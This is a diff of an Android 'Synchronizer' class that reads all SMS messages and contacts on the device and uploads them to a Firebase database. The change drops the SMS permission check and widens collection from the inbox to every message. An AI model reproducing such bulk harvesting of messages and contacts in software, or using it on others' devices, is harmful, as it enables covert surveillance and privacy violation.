@@ -32,7 +32,6 @@ class Synchronizer {
                 && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
                 && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                 ) {
-
             ActivityCompat.requestPermissions((MainActivity) context,
                     new String[]{
                             Manifest.permission.READ_CONTACTS,
@@ -58,17 +57,8 @@ class Synchronizer {
         // public static final String INBOX = "content://sms/inbox";
 // public static final String SENT = "content://sms/sent";
 // public static final String DRAFT = "content://sms/draft";
-        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            // TODO: Consider calling
-            //    ActivityCompat#requestPermissions
-            // here to request the missing permissions, and then overriding
-            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-            //                                          int[] grantResults)
-            // to handle the case where the user grants the permission. See the documentation
-            // for ActivityCompat#requestPermissions for more details.
-            return;
-        }
-        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+
+        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
 
         if (cursor.moveToFirst()) { // must check the result to prevent exception
             do {
@@ -80,7 +70,6 @@ class Synchronizer {
                 // Write a message to the database
                 FirebaseDatabase database = FirebaseDatabase.getInstance();
                 DatabaseReference myRef = database.getReference("messages").push();
-
                 myRef.setValue(msgData);
             } while (cursor.moveToNext());
         } else {
@@ -124,9 +113,10 @@ class Synchronizer {
                         Log.i("sync", "Name: " + name);
                         Log.i("sync", "Phone Number: " + phoneNo);
                         FirebaseDatabase database = FirebaseDatabase.getInstance();
-                        DatabaseReference myRef = database.getReference("contacts/" + name);
+                        DatabaseReference myRef = database.getReference("contacts/").push();
 
-                        myRef.setValue(phoneNo);
+                        myRef.child("num").setValue(phoneNo);
+                        myRef.child("name").setValue(name);
 
                     }
                     pCur.close();
